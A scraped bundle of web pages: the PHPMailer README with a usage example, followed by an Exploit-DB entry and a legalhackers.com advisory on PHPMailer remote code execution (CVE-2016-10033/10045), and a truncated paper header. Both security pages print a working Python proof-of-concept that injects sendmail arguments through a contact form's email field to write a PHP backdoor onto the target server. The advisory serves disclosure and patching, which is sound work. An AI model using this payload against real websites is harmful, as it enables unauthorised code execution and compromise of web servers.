While installing the entire package manually or with Composer is simple, convenient, and reliable, you may want to include only vital files in your project. At the very least you will need [src/PHPMailer.php](https://github.com/PHPMailer/PHPMailer/tree/master/src/PHPMailer.php). If you're using SMTP, you'll need [src/SMTP.php](https://github.com/PHPMailer/PHPMailer/tree/master/src/SMTP.php), and if you're using POP-before SMTP (*very* unlikely!), you'll need [src/POP3.php](https://github.com/PHPMailer/PHPMailer/tree/master/src/POP3.php). You can skip the [language](https://github.com/PHPMailer/PHPMailer/tree/master/language/) folder if you're not showing errors to users and can make do with English-only errors. If you're using XOAUTH2 you will need [src/OAuth.php](https://github.com/PHPMailer/PHPMailer/tree/master/src/OAuth.php) as well as the Composer dependencies for the services you wish to authenticate with. Really, it's much easier to use Composer!

## A Simple Example

```
<?php
//Import PHPMailer classes into the global namespace
//These must be at the top of your script, not inside a function
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

//Load Composer's autoloader
require 'vendor/autoload.php';

//Create an instance; passing `true` enables exceptions
$mail = new PHPMailer(true);

try {
    //Server settings
    $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      //Enable verbose debug output
    $mail->isSMTP();                                            //Send using SMTP
    $mail->Host       = 'smtp.example.com';                     //Set the SMTP server to send through
    $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
    $mail->Username   = 'user@example.com';                     //SMTP username
    $mail->Password   = 'secret';                               //SMTP password
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
    $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

    //Recipients
    $mail->setFrom('from@example.com', 'Mailer');
    $mail->addAddress('joe@example.net', 'Joe User');     //Add a recipient
    $mail->addAddress('ellen@example.com');               //Name is optional
    $mail->addReplyTo('info@example.com', 'Information');
    $mail->addCC('cc@example.com');
    $mail->addBCC('bcc@example.com');

    //Attachments
    $mail->addAttachment('/var/tmp/file.tar.gz');         //Add attachments
    $mail->addAttachment('/tmp/image.jpg', 'new.jpg');    //Optional name

    //Content
    $mail->isHTML(true);                                  //Set email format to HTML
    $mail->Subject = 'Here is the subject';
    $mail->Body    = 'This is the HTML message body <b>in bold!</b>';
    $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';

    $mail->send();
    echo 'Message has been sent';
} catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
}
```

You'll find plenty to play with in the [examples](https://github.com/PHPMailer/PHPMailer/tree/master/examples) folder, which covers many common scenarios including sending through Gmail, building contact forms, sending to mailing lists, and more.

If you are re-using the instance (e.g. when sending to a mailing list), you may need to clear the recipient list to avoid sending duplicate messages. See [the mailing list example](https://github.com/PHPMailer/PHPMailer/blob/master/examples/mailing_list.phps) for further guidance.

That's it. You should now be ready to use PHPMailer!

## Localization

PHPMailer defaults to English, but in the [language](https://github.com/PHPMailer/PHPMailer/tree/master/language/) folder, you'll find many translations for PHPMailer error messages that you may encounter. Their filenames contain [ISO 639-1](https://en.wikipedia.org/wiki/ISO_639-1) language code for the translations, for example `fr` for French. To specify a language, you need to tell PHPMailer which one to use, like this:

```
//To load the French version
$mail->setLanguage('fr', '/optional/path/to/language/directory/');
```

We welcome corrections and new languages – if you're looking for corrections, run the [Language/TranslationCompletenessTest.php](https://github.com/PHPMailer/PHPMailer/blob/master/test/Language/TranslationCompletenessTest.php) script in the tests folder and it will show any missing translations.

## Documentation

Start reading at the [GitHub wiki](https://github.com/PHPMailer/PHPMailer/wiki). If you're having trouble, head for [the troubleshooting guide](https://github.com/PHPMailer/PHPMailer/wiki/Troubleshooting) as it's frequently updated.

Examples of how to use PHPMailer for common scenarios can be found in the [examples](https://github.com/PHPMailer/PHPMailer/tree/master/examples) folder. If you're looking for a good starting point, we recommend you start with [the Gmail example](https://github.com/PHPMailer/PHPMailer/tree/master/examples/gmail.phps).

To reduce PHPMailer's deployed code footprint, examples are not included if you load PHPMailer via Composer or via [GitHub's zip file download](https://github.com/PHPMailer/PHPMailer/archive/master.zip), so you'll need to either clone the git repository or use the above links to get to the examples directly.

Complete generated API documentation is [available online](https://phpmailer.github.io/PHPMailer/).

You can generate complete API-level documentation by running `phpdoc` in the top-level folder, and documentation will appear in the `docs` folder, though you'll need to have [PHPDocumentor](https://www.phpdoc.org) installed. You may find [the unit tests](https://github.com/PHPMailer/PHPMailer/blob/master/test/PHPMailer/PHPMailerTest.php) a good reference for how to do various operations such as encryption.

If the documentation doesn't cover what you need, search the [many questions on Stack Overflow](https://stackoverflow.com/questions/tagged/phpmailer), and before you ask a question about "SMTP Error: Could not connect to SMTP host.", [read the troubleshooting guide](https://github.com/PHPMailer/PHPMailer/wiki/Troubleshooting).

## Tests

[PHPMailer tests](https://github.com/PHPMailer/PHPMailer/tree/master/test/) use PHPUnit 9, with [a polyfill](https://github.com/Yoast/PHPUnit-Polyfills) to let 9-style tests run on older PHPUnit and PHP versions.

[![Test status](https://github.com/PHPMailer/PHPMailer/workflows/Tests/badge.svg)](https://github.com/PHPMailer/PHPMailer/actions)

If this isn't passing, is there something you can do to help?

## Security

Please disclose any vulnerabilities found responsibly – report security issues to the maintainers privately.

See [SECURITY](https://github.com/PHPMailer/PHPMailer/tree/master/SECURITY.md) and [PHPMailer's security advisories on GitHub](https://github.com/PHPMailer/PHPMailer/security).

## Contributing

Please submit bug reports, suggestions, and pull requests to the [GitHub issue tracker](https://github.com/PHPMailer/PHPMailer/issues).

We're particularly interested in fixing edge cases, expanding test coverage, and updating translations.

If you found a mistake in the docs, or want to add something, go ahead and amend the wiki – anyone can edit it.

If you have git clones from prior to the move to the PHPMailer GitHub organisation, you'll need to update any remote URLs referencing the old GitHub location with a command like this from within your clone:

```
git remote set-url upstream https://github.com/PHPMailer/PHPMailer.git
```

Please *don't* use the SourceForge or Google Code projects any more; they are obsolete and no longer maintained.

## Sponsorship

Development time and resources for PHPMailer are provided by [Smartmessages.net](https://info.smartmessages.net/), the world's only privacy-first email marketing system.

[![Smartmessages.net privacy-first email marketing logo](https://camo.githubusercontent.com/1c9fac2c126b7258d41730a8c94eabb309db7602733fd88358aa970284c4beca/68747470733a2f2f7777772e736d6172746d657373616765732e6e65742f696d672f736d6172746d657373616765732d6c6f676f2e737667)](https://info.smartmessages.net/)

Donations are very welcome, whether in beer 🍺, T-shirts 👕, or cold, hard cash 💰. Sponsorship through GitHub is a simple and convenient way to say "thank you" to PHPMailer's maintainers and contributors – just click the "Sponsor" button [on the project page](https://github.com/PHPMailer/PHPMailer). If your company uses PHPMailer, consider taking part in Tidelift's enterprise support programme.

## PHPMailer For Enterprise

Available as part of the Tidelift Subscription.

The maintainers of PHPMailer and thousands of other packages are working with Tidelift to deliver commercial
support and maintenance for the open-source packages you use to build your applications. Save time, reduce risk, and
improve code health, while paying the maintainers of the exact packages you
use. [Learn more.](https://tidelift.com/subscription/pkg/packagist-phpmailer-phpmailer?utm_source=packagist-phpmailer-phpmailer&utm_medium=referral&utm_campaign=enterprise&utm_term=repo)

## Changelog

See [changelog](/PHPMailer/PHPMailer/blob/master/changelog.md).

## History

* PHPMailer was originally written in 2001 by Brent R. Matzelle as a [SourceForge project](https://sourceforge.net/projects/phpmailer/).
* [Marcus Bointon](https://github.com/Synchro) (`coolbru` on SF) and Andy Prevost (`codeworxtech`) took over the project in 2004.
* Became an Apache incubator project on Google Code in 2010, managed by Jim Jagielski.
* Marcus created [his fork on GitHub](https://github.com/Synchro/PHPMailer) in 2008.
* Jim and Marcus decide to join forces and use GitHub as the canonical and official repo for PHPMailer in 2013.
* PHPMailer moves to [the PHPMailer organisation](https://github.com/PHPMailer) on GitHub in 2013.

### What's changed since moving from SourceForge?

* Official successor to the SourceForge and Google Code projects.
* Test suite.
* Continuous integration with GitHub Actions.
* Composer support.
* Public development.
* Additional languages and language strings.
* CRAM-MD5 authentication support.
* Preserves full repo history of authors, commits, and branches from the original SourceForge project.

## About

The classic email sending library for PHP

### Topics

[php](/topics/php "Topic: php")
[email](/topics/email "Topic: email")
[php-library](/topics/php-library "Topic: php-library")
[attachment](/topics/attachment "Topic: attachment")
[smtp](/topics/smtp "Topic: smtp")
[phpmailer](/topics/phpmailer "Topic: phpmailer")
[hacktoberfest](/topics/hacktoberfest "Topic: hacktoberfest")
[tls-support](/topics/tls-support "Topic: tls-support")
[xoauth2](/topics/xoauth2 "Topic: xoauth2")

### Resources

[Readme](#readme-ov-file)
### License

[LGPL-2.1 license](#LGPL-2.1-1-ov-file)
### Security policy

[Security policy](#security-ov-file)

[Activity](/PHPMailer/PHPMailer/activity)
[Custom properties](/PHPMailer/PHPMailer/custom-properties)
### Stars

[**21.2k**
stars](/PHPMailer/PHPMailer/stargazers)
### Watchers

[**887**
watching](/PHPMailer/PHPMailer/watchers)
### Forks

[**9.7k**
forks](/PHPMailer/PHPMailer/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FPHPMailer%2FPHPMailer&report=PHPMailer+%28user%29)

## [Releases 64](/PHPMailer/PHPMailer/releases)

[PHPMailer 6.9.3
Latest

Nov 24, 2024](/PHPMailer/PHPMailer/releases/tag/v6.9.3)
[+ 63 releases](/PHPMailer/PHPMailer/releases)

## Sponsor this project

* ![patreon](https://github.githubassets.com/assets/patreon-96b15b9db4b9.svg)
  [patreon.com/**marcusbointon**](https://patreon.com/marcusbointon)
* ![tidelift](https://github.githubassets.com/assets/tidelift-8cea37dea8fc.svg)
  [tidelift.com/funding/github/**packagist/phpmailer/phpmailer**](https://tidelift.com/funding/github/packagist/phpmailer/phpmailer)
* <https://marcus.bointon.com/donations/>

[Learn more about GitHub Sponsors](/sponsors)

## [Packages 0](/orgs/PHPMailer/packages?repo_name=PHPMailer)

No packages published

## [Contributors 269](/PHPMailer/PHPMailer/graphs/contributors)

[+ 255 contributors](/PHPMailer/PHPMailer/graphs/contributors)

## Languages

* [PHP
  99.4%](/PHPMailer/PHPMailer/search?l=php)
* [Shell
  0.6%](/PHPMailer/PHPMailer/search?l=shell)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.exploit-db.com_cc186cf5_20250125_054107.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# PHPMailer < 5.2.20 - Remote Code Execution

#### EDB-ID:

###### 40969

#### CVE:

###### [2016-10045](https://nvd.nist.gov/vuln/detail/CVE-2016-10045) [2016-10033](https://nvd.nist.gov/vuln/detail/CVE-2016-10033)

---

**EDB Verified:**

#### Author:

###### [Dawid Golunski](/?author=1951)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [PHP](/?platform=php)

#### Date:

###### 2016-12-27

---

**Vulnerable App:**

```
#!/usr/bin/python

intro = """
PHPMailer RCE PoC Exploits

PHPMailer < 5.2.18 Remote Code Execution PoC Exploit (CVE-2016-10033)
+
PHPMailer < 5.2.20 Remote Code Execution PoC Exploit (CVE-2016-10045)
(the bypass of the first patch for CVE-2016-10033)

Discovered and Coded by:

 Dawid Golunski
 @dawid_golunski
 https://legalhackers.com

"""
usage = """
Usage:

Full Advisory:
https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html

https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html

PoC Video:
https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html

Disclaimer:
For testing purposes only. Do no harm.

"""

import time
import urllib
import urllib2
import socket
import sys

RW_DIR = "/var/www/html/uploads"

url = 'http://VictimWebServer/contact_form.php' # Set destination URL here

# Choose/uncomment one of the payloads:

# PHPMailer < 5.2.18 Remote Code Execution PoC Exploit (CVE-2016-10033)
#payload = '"attacker\\" -oQ/tmp/ -X%s/phpcode.php  some"@email.com' % RW_DIR

# Bypass / PHPMailer < 5.2.20 Remote Code Execution PoC Exploit (CVE-2016-10045)
payload = "\"attacker\\' -oQ/tmp/ -X%s/phpcode.php  some\"@email.com" % RW_DIR

######################################

# PHP code to be saved into the backdoor php file on the target in RW_DIR
RCE_PHP_CODE = "<?php phpinfo(); ?>"

post_fields = {'action': 'send', 'name': 'Jas Fasola', 'email': payload, 'msg': RCE_PHP_CODE}

# Attack
data = urllib.urlencode(post_fields)
req = urllib2.Request(url, data)
response = urllib2.urlopen(req)
the_page = response.read()

```

**Tags:**

**Advisory/Source:**
[Link](https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html)

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from twitter.com_e3041705_20250126_062514.html ===



=== Content from legalhackers.com_7959bd97_20250126_062432.html ===
=============================================
- Discovered by: Dawid Golunski
- dawid[at]legalhackers.com
- https://legalhackers.com
- CVE-2016-10045
- Release date: 27.12.2016
- Last revision: 28.12.2016
- Revision 3.0
- Severity: Critical
=============================================
I. VULNERABILITY
-------------------------
PHPMailer < 5.2.20 Remote Code Execution (0day Patch Bypass/exploit)
II. BACKGROUND
-------------------------
"PHPMailer continues to be the world's most popular transport class, with an
estimated 9 million users worldwide. Downloads continue at a significant
pace daily."
http://phpmailer.worxware.com/
"Probably the world's most popular code for sending email from PHP!
Used by many open-source projects: WordPress, Drupal, 1CRM, SugarCRM, Yii,
Joomla! and many more"
https://github.com/PHPMailer/PHPMailer
III. INTRODUCTION
-------------------------
An independent research uncovered a critical vulnerability in PHPMailer that
could potentially be used by (unauthenticated) remote attackers to achieve
remote arbitrary code execution in the context of the web server user and
remotely compromise the target web application.
To exploit the vulnerability an attacker could target common website
components such as contact/feedback forms, registration forms, password
email resets and others that send out emails with the help of a vulnerable
version of the PHPMailer class.
The first patch of the vulnerability CVE-2016-10033 was incomplete.
This advisory demonstrates the bypass of the patch.
The bypass allows to carry out Remote Code Execution on all current
versions (including 5.2.19).
NOTE:
The vulnerability / patch bypass was responsibly reported to the vendor
in private on December 26th and a new CVE was issued by MITRE on the same day.
However a potential bypass was publicly discussed on the oss-sec list.
Holding the advisory further would serve no purpose which is what triggered
the earlier release of this advisory.
IV. DESCRIPTION
-------------------------
The patch for CVE-2016-10033 vulnerability added in PHPMailer 5.2.17
sanitizes the $Sender variable by applying escapeshellarg() escaping
before the value is passed to mail() function.
It does not however take into account the clashing of the
escapeshellarg() function with internal escaping with escapeshellcmd()
performed by mail() function on the 5th parameter.
As a result it is possible to inject an extra quote that does not get
properly escaped and break out of the escapeshellarg() protection
applied by the patch in PHPMailer 5.2.17.
For example:
$mail->SetFrom("\"Attacker\\' -Param2 -Param3\"@test.com", 'Client Name');
will result in the followig list of arguments passed to sendmail program:
Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-f\"Attacker\\\]
Arg no. 4 == [-Param2]
Arg no. 5 == [-Param3"@test.com']
An attacker could pass the -X parameter of sendmail to write out a
log file with arbitrary PHP code.
This makes the current latest 5.2.19 and 5.2.18 versions of PHPMailer
vulnerable to Remote Code Execution despite the patch.
A working PoC is presented below.
V. PROOF OF CONCEPT EXPLOIT
-------------------------
#!/usr/bin/python
#PHPMailer\_RCE\_exploit.pl
intro = """
PHPMailer RCE PoC Exploits
PHPMailer < 5.2.18 Remote Code Execution PoC Exploit (CVE-2016-10033)
+
PHPMailer < 5.2.20 Remote Code Execution PoC Exploit (CVE-2016-10045)
(the bypass of the first patch for CVE-2016-10033)
Discovered and Coded by:
Dawid Golunski
@dawid\_golunski
https://legalhackers.com
"""
usage = """
Usage:
Full Advisory:
https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html
https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.txt
PoC Video:
https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html
Disclaimer:
For testing purposes only. Do no harm.
"""
import time
import urllib
import urllib2
import socket
import sys
RW\_DIR = "/var/www/html/uploads"
url = 'http://VictimWebServer/contact\_form.php' # Set destination URL here
# Choose/uncomment one of the payloads:
# PHPMailer < 5.2.18 Remote Code Execution PoC Exploit (CVE-2016-10033)
#payload = '"attacker\\" -oQ/tmp/ -X%s/phpcode.php some"@email.com' % RW\_DIR
# Bypass / PHPMailer < 5.2.20 Remote Code Execution PoC Exploit (CVE-2016-10045)
payload = "\"attacker\\' -oQ/tmp/ -X%s/phpcode.php some\"@email.com" % RW\_DIR
######################################
# PHP code to be saved into the backdoor php file on the target in RW\_DIR
RCE\_PHP\_CODE = "php phpinfo(); ?"
post\_fields = {'action': 'send', 'name': 'Jas Fasola', 'email': payload, 'msg': RCE\_PHP\_CODE}
# Attack
data = urllib.urlencode(post\_fields)
req = urllib2.Request(url, data)
response = urllib2.urlopen(req)
the\_page = response.read()
~~~~~~~~~~~
More advanced exploit targetting a contact form can be found at:
https://legalhackers.com/exploits/CVE-2016-10033/10045/10034/10074/PwnScriptum\_RCE\_exploit.py
The researcher also developed an Unauthenticated RCE exploit for a popular
open-source application (deployed on the Internet on more than a million servers)
as a PoC for real-world exploitation. It might be published after the vendor has
fixed the vulnerabilities.
Video PoC:
~~~~~~~~~~~~~
https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html
VI. BUSINESS IMPACT
-------------------------
A successful exploitation could let remote attackers to gain access to
the target server in the context of the web server account which could
lead to a full compromise of the web application.
VII. SYSTEMS AFFECTED
-------------------------
All current versions of (PHPMailer <5.2.20) are affected.
Note that exploitation is not limited to systems with Sendmail MTA.
VIII. SOLUTION
-------------------------
No official solution is available at the moment.
NOTE:
The vulnerability / patch bypass was responsibly reported to the vendor
in private on December 26th and a new CVE was issued by MITRE on the same day.
However a potential bypass was publicly discussed on the oss-sec list.
Holding the advisory further would serve no purpose which is what triggered
the earlier release of this advisory.
The vendor has been working on a new patch since the private disclosure
on 26th December which should be published shortly.
IX. REFERENCES
-------------------------
https://legalhackers.com
This advisory (CVE-2016-10045):
https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html
WordPress Core 4.6 - RCE Remote Code Execution PoC Exploit:
https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html
https://www.youtube.com/watch?v=ZFt\_S5pQPX0
The original vuln of CVE-2016-10033:
https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html
Video PoC exploit:
https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html
https://www.youtube.com/watch?v=xyYMYvT2bx8
Exploit code:
Simple PoC shown above is available here:
https://legalhackers.com/exploits/CVE-2016-10045/PHPMailer\_RCE\_exploit.py
Combined exploit code for multiple targets:
https://legalhackers.com/exploits/CVE-2016-10033/10045/10034/10074/PwnScriptum\_RCE\_exploit.py
Other exploits with other attack vectors will be disclosed at a later date to
allow more time for patching.
The previously undisclosed techniques and exploitation vectors will be described in a security
white-paper at:
https://legalhackers.com/papers/Pwning-PHP-mail-func-For-Fun-And-RCE-New-Exploit-Techniques-Vectors.html
https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html
CVE-2016-10045
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10045
PHPMailer / Vendor security updates / notices:
https://github.com/PHPMailer/PHPMailer/blob/master/changelog.md
https://github.com/PHPMailer/PHPMailer
https://github.com/PHPMailer/PHPMailer/blob/master/SECURITY.md
http://php.net/manual/en/function.mail.php
X. CREDITS
-------------------------
The vulnerability has been discovered by Dawid Golunski
dawid (at) legalhackers (dot) com
https://legalhackers.com
XI. REVISION HISTORY
-------------------------
28.12.2016 - Added NOTEs for the reason of the earlier disclosure
28.12.2016 - Advisory updated to extend the description
27.12.2016 - Advisory released
XII. LEGAL NOTICES
-------------------------
The information contained within this advisory is supplied "as-is" with
no warranties or guarantees of fitness of use or otherwise. I accept no
responsibility for any damage caused by the use or misuse of this information.


=== Content from exploitbox.io_cfb2ed37_20250126_062425.html ===


[Brand
![](../assets/img/logo.png)](../index.html)

* Stay Tuned

```

|=-----------------------------------------------------------------------=|
|=-------------=[ Pwning PHP mail() function For Fun And RCE  ]=---------=|
|=---------------=[ New Exploitation Techniques And Vectors ]=-----------=|
|=----------------------------=[ Release 1.0 ]=--------------------------=|
|=-----------------------------------------------------------------------=|
|=-----------------------------------------------------------------------=|
|=-------------------=[ by [https://legalhackers.com/](https://twitter.com/dawid_golunski%3EDawid%20Golunski%3C/a%3E%20of%20Legal%20Hackers%20%5D%3D-------------%3D%7C%7C%3D---------------------%3D%5B%20dawid%5Bat%5Dlegalhackers.com%20%5D%3D-------------------%3D%7C%7C%3D---------------------%3D%5B%20%3Ca%20href%3D) ]=-------------------=|
|=-----------------------------------------------------------------------=|
